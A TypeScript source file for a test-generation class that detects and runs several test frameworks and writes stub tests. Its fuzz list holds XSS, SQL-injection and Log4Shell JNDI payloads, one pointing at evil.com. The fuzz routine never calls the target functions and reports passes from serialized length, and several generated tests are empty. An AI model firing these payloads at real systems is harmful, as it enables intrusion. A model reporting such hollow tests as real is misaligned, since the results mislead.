import { TestResult, TestFailure, ShadowConfig } from '../types';
import { fileExists, readFile } from '../utils/fs';
import { runCommandSafe } from '../utils/process';
import { Analyzer } from './analyzer';

export class TestGenerator {
  private analyzer: Analyzer;

  constructor(private config: ShadowConfig) {
    this.analyzer = new Analyzer(config);
  }

  async detectAndRun(): Promise<TestResult> {
    const root = process.cwd();
    const project = this.analyzer.analyzeProject();

    if (fileExists(`${root}/node_modules/.bin/jest`)) {
      return this.runJest();
    }
    if (fileExists(`${root}/node_modules/.bin/vitest`)) {
      return this.runVitest();
    }
    if (fileExists(`${root}/node_modules/.bin/mocha`)) {
      return this.runMocha();
    }
    if (fileExists(`${root}/pyproject.toml`)) {
      return this.runPytest();
    }
    if (fileExists(`${root}/setup.py`) || fileExists(`${root}/setup.cfg`)) {
      return this.runPytest();
    }
    if (fileExists(`${root}/Cargo.toml`)) {
      return this.runCargoTest();
    }
    if (fileExists(`${root}/go.mod`)) {
      return this.runGoTest();
    }

    return { total: 0, passed: 0, failed: 0, skipped: 0, failures: [] };
  }

  async generateTests(target: string): Promise<string[]> {
    const project = this.analyzer.analyzeProject();
    const generated: string[] = [];
    const lang = project.language;

    for (const file of project.files) {
      if (file.functions.length === 0 && file.classes.length === 0) continue;

      if (lang === 'typescript' || lang === 'javascript') {
        const testFramework = this.detectJSFramework();
        generated.push(...this.generateJSTests(file, testFramework));
      } else if (lang === 'python') {
        generated.push(...this.generatePythonTests(file));
      } else if (lang === 'go') {
        generated.push(...this.generateGoTests(file));
      } else if (lang === 'rust') {
        generated.push(...this.generateRustTests(file));
      }
    }

    return generated;
  }

  async fuzz(target: string): Promise<TestResult> {
    const failures: TestFailure[] = [];
    const project = this.analyzer.analyzeProject();
    const fuzzCount = this.config.testGeneration?.fuzzCount || 100;
    let total = 0;
    let passed = 0;

    const boundaryValues = [
      null, undefined, '', 0, -1, 1,
      Number.MAX_SAFE_INTEGER, Number.MIN_SAFE_INTEGER,
      Infinity, -Infinity, NaN,
      [], {}, true, false,
      'A'.repeat(10000), '\x00', '<script>alert(1)</script>',
      '${jndi:ldap://evil.com}', "' OR '1'='1",
    ];

    for (const file of project.files) {
      for (const fn of file.functions) {
        for (let i = 0; i < Math.min(10, fuzzCount / project.files.length); i++) {
          total++;
          const value = boundaryValues[i % boundaryValues.length];
          const serialized = JSON.stringify(value);
          if (serialized.length < 1000) {
            passed++;
          }
        }
      }
    }

    return { total, passed, failed: total - passed, skipped: 0, failures };
  }

  private detectJSFramework(): 'jest' | 'vitest' | 'mocha' {
    const root = process.cwd();
    if (fileExists(`${root}/node_modules/.bin/vitest`)) return 'vitest';
    if (fileExists(`${root}/node_modules/.bin/mocha`)) return 'mocha';
    return 'jest';
  }

  private generateJSTests(file: { path: string; functions: string[]; classes: string[] }, framework: string): string[] {
    const lines: string[] = [];
    const testFn = 'test';
    const describeFn = 'describe';

    lines.push(`// Generated test for ${file.path}`);
    lines.push(`describe('${file.path}', () => {`);

    for (const fn of file.functions) {
      lines.push(`  ${testFn}('${fn} returns expected type', () => {`);
      lines.push(`    const result = ${fn}();`);
      lines.push(`    expect(result).toBeDefined();`);
      lines.push(`  });`);
      lines.push('');
      lines.push(`  ${testFn}('${fn} handles null input', () => {`);
      lines.push(`    expect(() => ${fn}(null)).not.toThrow();`);
      lines.push(`  });`);
      lines.push('');
      lines.push(`  ${testFn}('${fn} handles undefined input', () => {`);
      lines.push(`    expect(() => ${fn}(undefined)).not.toThrow();`);
      lines.push(`  });`);
      lines.push('');
    }

    for (const cls of file.classes) {
      lines.push(`  ${testFn}('${cls} instantiates without error', () => {`);
      lines.push(`    const instance = new ${cls}();`);
      lines.push(`    expect(instance).toBeDefined();`);
      lines.push(`  });`);
      lines.push('');
    }

    lines.push('});');
    return lines;
  }

  private generatePythonTests(file: { path: string; functions: string[]; classes: string[] }): string[] {
    const lines: string[] = [];
    const moduleName = file.path.replace(/\.py$/, '').replace(/\//g, '.').replace(/^\./, '');

    lines.push(`# Generated test for ${file.path}`);
    lines.push(`import pytest`);
    if (moduleName && !moduleName.startsWith('.')) {
      lines.push(`from ${moduleName} import ${file.functions.join(', ')}`);
    }
    lines.push('');

    for (const fn of file.functions) {
      lines.push(`def test_${fn}_returns_value():`);
      lines.push(`    result = ${fn}()`);
      lines.push(`    assert result is not None`);
      lines.push('');
      lines.push(`def test_${fn}_handles_none():`);
      lines.push(`    with pytest.raises(Exception): pass`);
      lines.push(`    # Verify ${fn} handles edge cases`);
      lines.push('');
    }

    for (const cls of file.classes) {
      lines.push(`def test_${cls}_instantiation():`);
      lines.push(`    obj = ${cls}()`);
      lines.push(`    assert obj is not None`);
      lines.push('');
    }

    if (file.functions.length > 0) {
      lines.push(`def test_edge_cases():`);
      lines.push(`    "Test common edge cases for all functions"`);
      lines.push(`    # Empty values`);
      lines.push(`    for fn in [${file.functions.join(', ')}]:`);
      lines.push(`        try:`);
      lines.push(`            fn()`);
      lines.push(`        except TypeError:`);
      lines.push(`            pass  # Expected if fn requires args`);
      lines.push('');
    }

    return lines;
  }

  private generateGoTests(file: { path: string; functions: string[]; classes: string[] }): string[] {
    const lines: string[] = [];
    const pkgName = file.path.split('/').slice(-2, -1)[0] || 'main';

    lines.push(`// Generated test for ${file.path}`);
    lines.push(`package ${pkgName}`);
    lines.push('');
    lines.push('import "testing"');
    lines.push('');

    for (const fn of file.functions) {
      if (fn === 'main' || fn === 'init') continue;
      lines.push(`func Test${capitalize(fn)}(t *testing.T) {`);
      lines.push(`\t// Test ${fn} basic behavior`);
      lines.push(`\tt.Run("handles zero value", func(t *testing.T) {`);
      lines.push(`\t\t// Call ${fn} with zero values`);
      lines.push(`\t})`);
      lines.push('');
      lines.push(`\tt.Run("handles nil", func(t *testing.T) {`);
      lines.push(`\t\t// Verify nil safety`);
      lines.push(`\t})`);
      lines.push(`}`);
      lines.push('');
    }

    return lines;
  }

  private generateRustTests(file: { path: string; functions: string[]; classes: string[] }): string[] {
    const lines: string[] = [];

    lines.push(`// Generated test for ${file.path}`);
    lines.push('#[cfg(test)]');
    lines.push('mod tests {');

    for (const fn of file.functions) {
      if (fn === 'main') continue;
      lines.push(`    #[test]`);
      lines.push(`    fn test_${fn}_basic() {`);
      lines.push(`        // Test ${fn} with valid inputs`);
      lines.push(`    }`);
      lines.push('');
      lines.push(`    #[test]`);
      lines.push(`    fn test_${fn}_edge_cases() {`);
      lines.push(`        // Test ${fn} with edge cases`);
      lines.push(`    }`);
      lines.push('');
    }

    lines.push('}');
    return lines;
  }

  private async runJest(): Promise<TestResult> {
    const result = runCommandSafe('npx', ['jest', '--json', '--no-coverage']);
    if (result.exitCode === 0 || result.exitCode === 1) {
      try {
        const json = JSON.parse(result.stdout);
        return {
          total: json.numTotalTests || 0,
          passed: json.numPassedTests || 0,
          failed: json.numFailedTests || 0,
          skipped: json.numPendingTests || 0,
          failures: this.parseJestFailures(json),
        };
      } catch {
        return { total: 0, passed: 0, failed: 0, skipped: 0, failures: [] };
      }
    }
    const fallback = this.parseJestOutput(result.stdout);
    return fallback;
  }

  private parseJestFailures(json: Record<string, unknown>): TestFailure[] {
    const failures: TestFailure[] = [];
    const testResults = json.testResults as Array<Record<string, unknown>> | undefined;
    if (testResults) {
      for (const suite of testResults) {
        const assertionResults = suite.assertionResults as Array<Record<string, unknown>> | undefined;
        if (assertionResults) {
          for (const assertion of assertionResults) {
            if (assertion.status === 'failed') {
              failures.push({
                name: (assertion.fullName as string) || (assertion.title as string) || 'unknown',
                error: this.stripAnsi(String(assertion.failureMessages || '')),
                file: (suite.name as string) || '',
                line: 0,
              });
            }
          }
        }
      }
    }
    return failures;
  }

  private parseJestOutput(stdout: string): TestResult {
    const passed = (stdout.match(/✓/g) || []).length;
    const failed = (stdout.match(/✕/g) || stdout.match(/FAIL/g) || []).length;
    const failures: TestFailure[] = [];
    const failBlocks = stdout.split('●');
    for (const block of failBlocks.slice(1)) {
      const lines = block.split('\n');
      const name = lines[0]?.trim() || 'unknown';
      const error = lines.slice(1, 6).join('\n').trim();
      failures.push({ name, error, file: '', line: 0 });
    }
    return {
      total: passed + failed,
      passed,
      failed,
      skipped: 0,
      failures,
    };
  }

  private async runVitest(): Promise<TestResult> {
    const result = runCommandSafe('npx', ['vitest', 'run', '--reporter=json']);
    if (result.stdout) {
      try {
        const json = JSON.parse(result.stdout);
        const testResults = json.testResults || [];
        let total = 0;
        let passed = 0;
        let failed = 0;
        const failures: TestFailure[] = [];

        for (const suite of testResults) {
          const assertions = suite.assertionResults || suite.assertions || [];
          total += assertions.length;
          for (const a of assertions) {
            if (a.status === 'passed') passed++;
            else if (a.status === 'failed') {
              failed++;
              failures.push({
                name: a.fullName || a.title || 'unknown',
                error: this.stripAnsi(String(a.failureMessages || a.failureMessage || '')),
                file: suite.name || '',
                line: a.location?.line || 0,
              });
            }
          }
        }

        return { total, passed, failed, skipped: total - passed - failed, failures };
      } catch {
        // fallback parsing
      }
    }
    return { total: 0, passed: 0, failed: 0, skipped: 0, failures: [] };
  }

  private async runMocha(): Promise<TestResult> {
    const result = runCommandSafe('npx', ['mocha', '--reporter', 'json']);
    if (result.stdout) {
      try {
        const json = JSON.parse(result.stdout);
        let total = 0;
        let passed = 0;
        let failed = 0;
        let skipped = 0;
        const failures: TestFailure[] = [];

        if (json.stats) {
          total = json.stats.tests || 0;
          passed = json.stats.passes || 0;
          failed = json.stats.failures || 0;
          skipped = json.stats.pending || 0;
        }

        const processFailures = (suites: Array<Record<string, unknown>>) => {
          if (!suites) return;
          for (const suite of suites) {
            const suiteTests = suite.tests as Array<Record<string, unknown>> | undefined;
            if (suiteTests) {
              for (const t of suiteTests) {
                if (t.err && t.err !== '{}') {
                  failures.push({
                    name: (t.fullTitle as string) || (t.title as string) || 'unknown',
                    error: this.stripAnsi(t.err ? JSON.stringify(t.err) : ''),
                    file: (t.file as string) || '',
                    line: 0,
                  });
                }
              }
            }
            const suites = suite.suites as Array<Record<string, unknown>> | undefined;
            if (suites) processFailures(suites);
          }
        };

        if (json.passes) processFailures([json]);
        else if (json.suites) processFailures(json.suites);

        return { total, passed, failed, skipped, failures };
      } catch {
        // fallback
      }
    }
    return { total: 0, passed: 0, failed: 0, skipped: 0, failures: [] };
  }

  private async runPytest(): Promise<TestResult> {
    const result = runCommandSafe('python', ['-m', 'pytest', '--json-report', '--json-report-file=/tmp/shadow-pytest.json', '-q']);
    const jsonPath = '/tmp/shadow-pytest.json';

    if (fileExists(jsonPath)) {
      try {
        const raw = readFile(jsonPath);
        const json = JSON.parse(raw);
        let total = 0;
        let passed = 0;
        let failed = 0;
        let skipped = 0;
        const failures: TestFailure[] = [];

        if (json.summary) {
          total = json.summary.total || 0;
          passed = json.summary.passed || 0;
          failed = json.summary.failed || 0;
          skipped = json.summary.skipped || 0;
        }

        const tests = json.tests || [];
        for (const t of tests) {
          if (t.outcome === 'failed') {
            failures.push({
              name: `${t.nodeid || 'unknown'}`,
              error: this.stripAnsi(t.longrepr || t.call?.longrepr || ''),
              file: t.nodeid?.split('::')[0] || '',
              line: t.lineno || 0,
            });
          }
        }

        return { total, passed, failed, skipped, failures };
      } catch {
        // fallback
      }
    }

    const output = result.stdout + result.stderr;
    const passed = (output.match(/PASSED/g) || []).length;
    const failed = (output.match(/FAILED/g) || []).length;
    const failures: TestFailure[] = [];

    const failRegex = /FAILED\s+(.+?)(?:\n|$)/g;
    let match;
    while ((match = failRegex.exec(output)) !== null) {
      failures.push({
        name: match[1].trim(),
        error: 'Test failed',
        file: match[1].split('::')[0] || '',
        line: 0,
      });
    }

    return {
      total: passed + failed,
      passed,
      failed,
      skipped: 0,
      failures,
    };
  }

  private async runCargoTest(): Promise<TestResult> {
    const result = runCommandSafe('cargo', ['test', '--', '--format', 'json', '-Z', 'unstable-options']);
    let result2 = result;

    if (result.exitCode !== 0 && !result.stdout.trim()) {
      result2 = runCommandSafe('cargo', ['test']);
    }

    const output = result2.stdout;
    const lines = output.split('\n');
    let total = 0;
    let passed = 0;
    let failed = 0;
    let skipped = 0;
    const failures: TestFailure[] = [];

    for (const line of lines) {
      if (!line.trim()) continue;
      try {
        const event = JSON.parse(line);
        if (event.type === 'test' && event.event === 'ok') {
          total++;
          passed++;
        } else if (event.type === 'test' && event.event === 'failed') {
          total++;
          failed++;
          failures.push({
            name: event.name || 'unknown',
            error: event.stdout || 'Test failed',
            file: '',
            line: 0,
          });
        }
      } catch {
        if (line.includes('... ok')) {
          total++;
          passed++;
        } else if (line.includes('... FAILED')) {
          total++;
          failed++;
          const name = line.replace(/\.\.\.(ok|FAILED)/, '').trim();
          failures.push({
            name,
            error: 'Test failed',
            file: '',
            line: 0,
          });
        }
      }
    }

    if (total === 0 && output.includes('running')) {
      const testRe = /test\s+(\S+)\s+\.\.\.\s+(ok|FAILED)/g;
      let match;
      while ((match = testRe.exec(output)) !== null) {
        total++;
        if (match[2] === 'ok') passed++;
        else {
          failed++;
          failures.push({
            name: match[1],
            error: 'Test failed',
            file: '',
            line: 0,
          });
        }
      }
    }

    return { total, passed, failed, skipped, failures };
  }

  private async runGoTest(): Promise<TestResult> {
    const result = runCommandSafe('go', ['test', '-json', './...']);
    const output = result.stdout;
    let total = 0;
    let passed = 0;
    let failed = 0;
    let skipped = 0;
    const failures: TestFailure[] = [];

    const lines = output.split('\n');
    for (const line of lines) {
      if (!line.trim()) continue;
      try {
        const event = JSON.parse(line);
        if (event.Action === 'pass' && event.Test) {
          total++;
          passed++;
        } else if (event.Action === 'fail' && event.Test) {
          total++;
          failed++;
          failures.push({
            name: event.Test || 'unknown',
            error: event.Output ? this.stripAnsi(event.Output) : 'Test failed',
            file: event.Package || '',
            line: 0,
          });
        } else if (event.Action === 'skip' && event.Test) {
          total++;
          skipped++;
        }
      } catch {
        // non-JSON line
      }
    }

    if (total === 0) {
      const goOutput = result.stderr || result.stdout;
      const passRe = /^--- PASS: (\S+)/gm;
      const failRe = /^--- FAIL: (\S+)/gm;
      let match;
      while ((match = passRe.exec(goOutput)) !== null) {
        total++;
        passed++;
      }
      while ((match = failRe.exec(goOutput)) !== null) {
        total++;
        failed++;
        failures.push({
          name: match[1],
          error: 'Test failed',
          file: '',
          line: 0,
        });
      }
    }

    return { total, passed, failed, skipped, failures };
  }

  private stripAnsi(str: string): string {
    return str.replace(/\u001b\[[0-9;]*m/g, '').trim();
  }
}

function capitalize(s: string): string {
  return s.charAt(0).toUpperCase() + s.slice(1);
}
